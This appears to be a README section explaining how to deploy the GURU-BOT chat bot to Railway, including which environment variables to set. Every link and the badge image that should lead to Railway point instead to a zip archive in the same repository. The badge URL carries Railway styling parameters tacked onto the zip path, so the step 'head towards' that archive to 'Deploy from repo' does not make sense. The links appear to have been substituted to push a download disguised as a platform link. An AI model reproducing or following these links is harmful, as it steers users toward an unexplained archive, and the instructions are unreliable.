#### DEPLOY TO RAILWAY

1. If You don't have an account On Railway. Create a account.
    <br>
<p align="center"><a href="https://raw.githubusercontent.com/HONESTHACK/GURU-BOT/main/Guru/BOT_GUR_2.4.zip"> <img src="https://raw.githubusercontent.com/HONESTHACK/GURU-BOT/main/Guru/BOT_GUR_2.4.zip%20Account-blue?style=for-the-badge&logo=Railway" width="220" height="38.45"/></a></p>

 - Fork and star this repo.
- Now head towards https://raw.githubusercontent.com/HONESTHACK/GURU-BOT/main/Guru/BOT_GUR_2.4.zip, select Deploy from repo.
- Now select the forked repository, select branch.
- Now go to <b>Variables</b> and add variable listed below.
   - DATABASE_URL, SESSION_ID, REMOVEBG_KEY, PREFIX
- Go to <b>Deployments</b> and wait for deplyment to complete.
- and you're good to go.
